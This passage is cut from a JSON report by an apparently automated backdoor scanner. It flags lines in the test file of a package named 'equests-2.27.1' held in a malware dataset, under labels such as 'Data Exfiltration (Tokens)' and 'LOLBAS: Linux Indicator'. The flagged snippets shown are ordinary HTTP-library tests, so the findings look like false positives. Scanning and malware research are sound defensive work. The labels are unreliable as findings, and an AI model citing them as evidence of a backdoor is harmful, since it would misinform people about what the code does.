                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 20,
                  "endLine": 119,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        headers = {\n            'Content-Length': 'not zero'\n        }\n        r = requests.Request('POST', httpbin('post'), headers=headers).prepare()\n        assert 'Content-Length' in r.headers\n        assert r.headers['Content-Length'] == 'not zero'\n\n",
                    "rendered": {
                      "text": "        headers = {\n            'Content-Length': 'not zero'\n        }\n        r = requests.Request('POST', httpbin('post'), headers=headers).prepare()\n        assert 'Content-Length' in r.headers\n        assert r.headers['Content-Length'] == 'not zero'\n\n",
                      "markdown": "`        headers = {\n            'Content-Length': 'not zero'\n        }\n        r = requests.Request('POST', httpbin('post'), headers=headers).prepare()\n        assert 'Content-Length' in r.headers\n        assert r.headers['Content-Length'] == 'not zero'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 22,
                  "endLine": 112,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_empty_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower()), data='').prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    def test_override_content_length(self, httpbin):\n",
                    "rendered": {
                      "text": "\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_empty_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower()), data='').prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    def test_override_content_length(self, httpbin):\n",
                      "markdown": "`\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_empty_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower()), data='').prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    def test_override_content_length(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 22,
                  "endLine": 107,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_no_body_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n",
                    "rendered": {
                      "text": "\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_no_body_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n",
                      "markdown": "`\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n    def test_no_body_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert req.headers['Content-Length'] == '0'\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 22,
                  "endLine": 102,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    @pytest.mark.parametrize('method', ('GET', 'HEAD'))\n    def test_no_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert 'Content-Length' not in req.headers\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n",
                    "rendered": {
                      "text": "\n    @pytest.mark.parametrize('method', ('GET', 'HEAD'))\n    def test_no_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert 'Content-Length' not in req.headers\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n",
                      "markdown": "`\n    @pytest.mark.parametrize('method', ('GET', 'HEAD'))\n    def test_no_content_length(self, httpbin, method):\n        req = requests.Request(method, httpbin(method.lower())).prepare()\n        assert 'Content-Length' not in req.headers\n\n    @pytest.mark.parametrize('method', ('POST', 'PUT', 'PATCH', 'OPTIONS'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 22,
                  "endLine": 92,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n        req.url = 'http://kennethreitz.org/'\n        req.data = {'life': '42'}\n\n",
                    "rendered": {
                      "text": "            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n        req.url = 'http://kennethreitz.org/'\n        req.data = {'life': '42'}\n\n",
                      "markdown": "`            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n        req.url = 'http://kennethreitz.org/'\n        req.data = {'life': '42'}\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 20,
                  "endLine": 89,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_invalid_url(self, exception, url):\n        with pytest.raises(exception):\n            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n",
                    "rendered": {
                      "text": "        ))\n    def test_invalid_url(self, exception, url):\n        with pytest.raises(exception):\n            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n",
                      "markdown": "`        ))\n    def test_invalid_url(self, exception, url):\n        with pytest.raises(exception):\n            requests.get(url)\n\n    def test_basic_building(self):\n        req = requests.Request()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1818,
                  "startColumn": 38,
                  "endLine": 1818,
                  "endColumn": 46,
                  "snippet": {
                    "text": "            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n\n",
                    "rendered": {
                      "text": "            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n\n",
                      "markdown": "`            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1817,
                  "startColumn": 61,
                  "endLine": 1817,
                  "endColumn": 69,
                  "snippet": {
                    "text": "            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n",
                    "rendered": {
                      "text": "            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n",
                      "markdown": "`            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n    def test_basic_auth_str_is_always_native(self, username, password, auth_str):\n        s = _basic_auth_str(username, password)\n        assert isinstance(s, builtin_str)\n        assert s == auth_str\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1813,
                  "startColumn": 19,
                  "endLine": 1813,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n",
                    "rendered": {
                      "text": "        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n",
                      "markdown": "`        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n            ('test', 'test', 'Basic dGVzdDp0ZXN0'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8'), 'Basic 0LjQvNGPOtC/0LDRgNC+0LvRjA=='),\n        ))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 516,
                  "startColumn": 71,
                  "endLine": 516,
                  "endColumn": 79,
                  "snippet": {
                    "text": "        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n\n    def test_basicauth_encodes_byte_strings(self):\n        \"\"\"Ensure b'test' formats as the byte string \"test\" rather\n",
                    "rendered": {
                      "text": "        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n\n    def test_basicauth_encodes_byte_strings(self):\n        \"\"\"Ensure b'test' formats as the byte string \"test\" rather\n",
                      "markdown": "`        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n\n    def test_basicauth_encodes_byte_strings(self):\n        \"\"\"Ensure b'test' formats as the byte string \"test\" rather\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 510,
                  "startColumn": 26,
                  "endLine": 510,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n",
                    "rendered": {
                      "text": "            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n",
                      "markdown": "`            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 509,
                  "startColumn": 52,
                  "endLine": 509,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            (42, 42),\n            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n",
                    "rendered": {
                      "text": "            (42, 42),\n            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n",
                      "markdown": "`            (42, 42),\n            (None, None),\n        ))\n    def test_set_basicauth(self, httpbin, username, password):\n        auth = (username, password)\n        url = httpbin('get')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 503,
                  "startColumn": 19,
                  "endLine": 503,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n        'username, password', (\n            ('user', 'pass'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8')),\n            (42, 42),\n",
                    "rendered": {
                      "text": "        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n        'username, password', (\n            ('user', 'pass'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8')),\n            (42, 42),\n",
                      "markdown": "`        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n        'username, password', (\n            ('user', 'pass'),\n            (u'имя'.encode('utf-8'), u'пароль'.encode('utf-8')),\n            (42, 42),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 583,
                  "startColumn": 27,
                  "endLine": 583,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n",
                    "rendered": {
                      "text": "                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n",
                      "markdown": "`                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2262,
                  "startColumn": 53,
                  "endLine": 2262,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n\n",
                    "rendered": {
                      "text": "    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n\n",
                      "markdown": "`    def test_total_timeout_connect(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout:\n            pass\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2249,
                  "startColumn": 53,
                  "endLine": 2249,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n            assert isinstance(e, Timeout)\n",
                    "rendered": {
                      "text": "    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n            assert isinstance(e, Timeout)\n",
                      "markdown": "`    def test_connect_timeout(self, timeout):\n        try:\n            requests.get(TARPIT, timeout=timeout)\n            pytest.fail('The connect() request should time out.')\n        except ConnectTimeout as e:\n            assert isinstance(e, ConnectionError)\n            assert isinstance(e, Timeout)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2237,
                  "startColumn": 50,
                  "endLine": 2237,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n\n",
                    "rendered": {
                      "text": "    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n\n",
                      "markdown": "`    def test_read_timeout(self, httpbin, timeout):\n        try:\n            requests.get(httpbin('delay/10'), timeout=timeout)\n            pytest.fail('The recv() request should time out.')\n        except ReadTimeout:\n            pass\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2223,
                  "startColumn": 42,
                  "endLine": 2223,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n",
                    "rendered": {
                      "text": "        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n",
                      "markdown": "`        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n        \"\"\"\n        r = requests.get(httpbin('get'), timeout=timeout)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2221,
                  "startColumn": 7,
                  "endLine": 2221,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n",
                    "rendered": {
                      "text": "        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n",
                      "markdown": "`        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n        timeout. However, this would make the test suite unbearably slow.\n        Instead we verify that setting the timeout to None does not prevent the\n        request from succeeding.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 2218,
                  "startColumn": 49,
                  "endLine": 2218,
                  "endColumn": 58,
                  "snippet": {
                    "text": "            Urllib3Timeout(connect=None, read=None)\n        ))\n    def test_none_timeout(self, httpbin, timeout):\n        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n",
                    "rendered": {
                      "text": "            Urllib3Timeout(connect=None, read=None)\n        ))\n    def test_none_timeout(self, httpbin, timeout):\n        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n",
                      "markdown": "`            Urllib3Timeout(connect=None, read=None)\n        ))\n    def test_none_timeout(self, httpbin, timeout):\n        \"\"\"Check that you can set None as a valid timeout value.\n\n        To actually test this behavior, we'd want to check that setting the\n        timeout to None actually lets the request block past the system default\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 882,
                  "startColumn": 41,
                  "endLine": 882,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n",
                    "rendered": {
                      "text": "\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n",
                      "markdown": "`\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
